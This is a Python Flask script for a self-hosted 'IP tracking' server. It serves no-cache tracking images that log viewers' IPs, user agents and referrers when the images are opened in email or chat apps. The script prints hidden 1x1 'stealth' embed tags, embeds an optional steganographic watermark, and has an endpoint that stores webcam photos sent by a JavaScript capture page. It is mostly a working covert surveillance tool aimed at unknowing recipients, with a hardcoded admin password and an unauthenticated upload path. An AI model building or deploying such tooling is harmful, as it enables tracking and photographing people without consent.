#!/usr/bin/env python3
"""
Self-hosted IP tracking / image logging system.
Requires: Python 3.7+, Flask, Pillow, opencv-python (optional for stego).
No third-party APIs.  All self-contained.
"""

from flask import make_response
import os
import sys
import json
import uuid
import time
import hashlib
import hmac
import base64
import datetime
import sqlite3
import subprocess
import argparse
from pathlib import Path
from io import BytesIO
from functools import wraps

# Flask
from flask import Flask, request, send_file, jsonify, render_template_string, redirect, url_for, session, abort, Response, make_response

# Imaging
try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False
    print("WARNING: Pillow not installed. Image manipulation disabled.", file=sys.stderr)

try:
    import cv2
    import numpy as np
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

# -------------------------------------------------------------------
# CONFIG
# -------------------------------------------------------------------
DB_PATH = "tracking.db"
UPLOAD_FOLDER = "captured_photos"
IMAGE_SOURCE = "IMG_1779.jpg"          # default image served
ADMIN_PASSWORD = "admin123"
SECRET_KEY = "change-this-secret-key-in-production"
SERVER_BASE_URL = "http://192.168.1.9:5000"   # change to your domain
STEGO_WATERMARK = False            # set True to embed invisible watermark
WATERMARK_TEXT = SERVER_BASE_URL

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

app = Flask(__name__)
app.secret_key = SECRET_KEY

# -------------------------------------------------------------------
# DATABASE SETUP
# -------------------------------------------------------------------
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token TEXT UNIQUE,
            ip TEXT,
            forwarded_ip TEXT,
            client_ip TEXT,
            user_agent TEXT,
            referrer TEXT,
            timestamp TEXT,
            country TEXT,
            isp TEXT,
            photo_path TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# -------------------------------------------------------------------
# IP EXTRACTION LOGIC (Cloudflare / proxy aware)
# -------------------------------------------------------------------
def extract_client_ip():
    """Return the most reliable client IP, bypassing proxies/Cloudflare."""
    # Check Cloudflare-specific header first
    cf_ip = request.headers.get('CF-Connecting-IP')
    if cf_ip:
        return cf_ip.strip()

    # Check X-Forwarded-For (standard proxy)
    xff = request.headers.get('X-Forwarded-For')
    if xff:
        # First IP is original client
        ips = [ip.strip() for ip in xff.split(',')]
        if ips:
            return ips[0]

    # Check X-Real-IP (nginx)
    xri = request.headers.get('X-Real-IP')
    if xri:
        return xri.strip()

    # Fallback to REMOTE_ADDR
    return request.remote_addr or '0.0.0.0'

# -------------------------------------------------------------------
# LOGGING
# -------------------------------------------------------------------
def log_request(image_token=None):
    """Log incoming request data to database."""
    ip = request.remote_addr or '0.0.0.0'
    xff = request.headers.get('X-Forwarded-For', '')
    client_ip = extract_client_ip()
    ua = request.headers.get('User-Agent', '')
    referrer = request.headers.get('Referer', '')
    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
    token = image_token or str(uuid.uuid4())

    # Optional: local GeoIP lookup (uncomment if you have GeoLite2 DB)
    country = ''
    isp = ''
    # if HAS_CV2: country = geo_ip_lookup(client_ip) ...

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    try:
        c.execute('''
            INSERT INTO logs (token, ip, forwarded_ip, client_ip, user_agent, referrer, timestamp, country, isp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (token, ip, xff, client_ip, ua, referrer, ts, country, isp))
        conn.commit()
    except sqlite3.IntegrityError:
        pass  # token duplicate
    finally:
        conn.close()

    return token

# -------------------------------------------------------------------
# STEGANOGRAPHY (invisible watermark embedding)
# -------------------------------------------------------------------
def embed_watermark(image_path, watermark_text):
    """Embed invisible text into image using LSB steganography (OpenCV)."""
    if not HAS_CV2:
        return image_path

    img = cv2.imread(image_path)
    if img is None:
        return image_path

    # Convert text to binary
    binary_data = ''.join(format(ord(c), '08b') for c in watermark_text)
    binary_data += '1111111111111110'  # delimiter

    data_idx = 0
    h, w, _ = img.shape

    for row in range(h):
        for col in range(w):
            for channel in range(3):  # BGR
                if data_idx < len(binary_data):
                    # Modify LSB
                    img[row, col, channel] = (img[row, col, channel] & 0xFE) | int(binary_data[data_idx])
                    data_idx += 1
                else:
                    break
            if data_idx >= len(binary_data):
                break
        if data_idx >= len(binary_data):
            break

    out_path = image_path.replace('.', '_stego.')
    cv2.imwrite(out_path, img)
    return out_path

# -------------------------------------------------------------------
# FLASK ROUTES
# -------------------------------------------------------------------

# HTML admin dashboard template
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head><title>Tracking Dashboard</title>
<style>
body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
table { border-collapse: collapse; width: 100%; }
th, td { border: 1px solid #0f0; padding: 8px; text-align: left; }
th { background: #222; }
img.thumb { max-width: 100px; max-height: 100px; }
</style></head>
<body>
<h1>Tracking Dashboard</h1>
<table>
<tr><th>ID</th><th>Token</th><th>IP</th><th>Client IP</th><th>UA</th><th>Referrer</th><th>Timestamp</th><th>Photo</th></tr>
{% for row in rows %}
<tr>
<td>{{ row[0] }}</td>
<td>{{ row[1] }}</td>
<td>{{ row[2] }}</td>
<td>{{ row[4] }}</td>
<td>{{ row[5][:60] }}</td>
<td>{{ row[6][:40] }}</td>
<td>{{ row[7] }}</td>
<td>{% if row[9] %}<img class="thumb" src="/captured/{{ row[9] }}">{% else %}N/A{% endif %}</td>
</tr>
{% endfor %}
</table>
</body>
</html>
'''

@app.route('/dashboard')
def dashboard():
    """Password-protected admin panel."""
    if not session.get('admin'):
        return redirect(url_for('login'))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM logs ORDER BY id DESC")
    rows = c.fetchall()
    conn.close()
    return render_template_string(DASHBOARD_HTML, rows=rows)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['admin'] = True
            return redirect(url_for('dashboard'))
        return "Wrong password", 403
    return '''
    <form method="POST">
        Password: <input type="password" name="password">
        <input type="submit" value="Login">
    </form>
    '''

@app.route('/logout')
def logout():
    session.pop('admin', None)
    return redirect(url_for('login'))

@app.route('/tracking.png')
@app.route('/photo.jpg')
@app.route('/image/<token>')
def serve_tracking_image(token=None):
    """
    Serve a real image file while logging the request.
    Works in email clients, Discord, Telegram, WhatsApp, browsers.
    No-cache headers force a fresh request every time.
    """
    # Generate token if not provided
    img_token = token or str(uuid.uuid4())

    # Log the request
    log_request(img_token)

    # Serve the real image
    img_path = IMAGE_SOURCE
    if not os.path.exists(img_path):
        # Create a default image if none exists
        if HAS_PIL:
            img = Image.new('RGB', (800, 600), color='darkblue')
            img.save(img_path)
        else:
            abort(404, "No image source found. Place photo.jpg in server directory.")

    response = make_response(send_file(img_path, mimetype='image/png' if img_path.endswith('.png') else 'image/jpeg'))
    # Disable caching completely — forces browser/email client to request the image fresh each time
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0, private'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

@app.route('/capture', methods=['POST'])
def capture_photo():
    """
    Endpoint for JavaScript webcam capture.
    Receives Base64-encoded image and saves it.
    """
    data = request.get_json()
    if not data or 'image' not in data or 'token' not in data:
        return jsonify({'status': 'error', 'message': 'Missing data'}), 400

    token = data['token']
    image_b64 = data['image']

    # Decode Base64
    try:
        image_data = base64.b64decode(image_b64.split(',')[-1])
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400

    # Save photo
    filename = f"{token}.jpg"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    with open(filepath, 'wb') as f:
        f.write(image_data)

    # Update DB with photo path
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE logs SET photo_path = ? WHERE token = ?", (filename, token))
    conn.commit()
    conn.close()

    return jsonify({'status': 'ok'}), 200

@app.route('/captured/<filename>')
def serve_captured(filename):
    """Serve captured webcam photos (admin only)."""
    if not session.get('admin'):
        abort(403)
    return send_file(os.path.join(UPLOAD_FOLDER, filename))

@app.route('/api/logs')
def api_logs():
    """JSON API for logs (admin only)."""
    if not session.get('admin'):
        abort(403)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM logs ORDER BY id DESC")
    rows = c.fetchall()
    conn.close()
    return jsonify(rows)

# -------------------------------------------------------------------
# IMAGE PREPARATION SCRIPT (CLI)
# -------------------------------------------------------------------
def prepare_image(input_path, output_name=None, embed_watermark_flag=False):
    """Process an image for tracking: rename, optional watermark, output embed tag."""
    if not os.path.exists(input_path):
        print(f"Error: file {input_path} not found.")
        return

    # Generate unique hash-based filename
    if output_name:
        out_name = output_name
    else:
        file_hash = hashlib.sha256(str(time.time()).encode()).hexdigest()[:12]
        ext = Path(input_path).suffix
        out_name = f"{file_hash}{ext}"

    out_path = f"tracking_{out_name}"
    # Copy file
    if HAS_PIL:
        img = Image.open(input_path)
        img.save(out_path)
    else:
        import shutil
        shutil.copy2(input_path, out_path)

    # Optional watermark
    if embed_watermark_flag and HAS_CV2:
        out_path = embed_watermark(out_path, WATERMARK_TEXT)
        print(f"[Stego] Watermark embedded: {WATERMARK_TEXT}")

    # Direct URL and embed tag
    direct_url = f"{SERVER_BASE_URL}/image/{out_name.replace(Path(out_name).suffix, '')}"
    img_tag = f'<img src="{SERVER_BASE_URL}/{out_name}" alt="tracking">'

    print(f"\n[OK] Prepared image: {out_path}")
    print(f"[URL] Direct URL: {direct_url}")
    print(f"[IMG] Embed tag: {img_tag}")
    print(f"[Embed] Copy-paste HTML: <img src=\"{SERVER_BASE_URL}/{out_name}\" width=\"1\" height=\"1\">  (for stealth)")

# ---------------- ROUTES ----------------
@app.route('/capture.html')
def serve_capture_page():
    return send_file('capture.html')

# -------------------------------------------------------------------
# MAIN
# -------------------------------------------------------------------
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Self-hosted IP tracking/image logging system")
    parser.add_argument('--prepare', help="Run image preparation on a file")
    parser.add_argument('--output', help="Output filename for prepared image")
    parser.add_argument('--watermark', action='store_true', help="Embed invisible watermark with server URL")
    parser.add_argument('--server', action='store_true', help="Start the Flask tracking server")
    parser.add_argument('--host', default='0.0.0.0', help="Server bind address")
    parser.add_argument('--port', type=int, default=5000, help="Server port")
    parser.add_argument('--image', default='photo.jpg', help="Image file to serve for tracking")
    args = parser.parse_args()

    if args.prepare:
        prepare_image(args.prepare, args.output, args.watermark)
        sys.exit(0)

    if args.server or len(sys.argv) == 1:
        IMAGE_SOURCE = args.image
        print(f"[*] Tracking server starting on {args.host}:{args.port}")
        print(f"[*] Serving image: {IMAGE_SOURCE}")
        print(f"[*] Tracking URL: {SERVER_BASE_URL}/tracking.png")
        print(f"[*] Admin dashboard: {SERVER_BASE_URL}/dashboard  (password: {ADMIN_PASSWORD})")
        app.run(host=args.host, port=args.port, debug=False)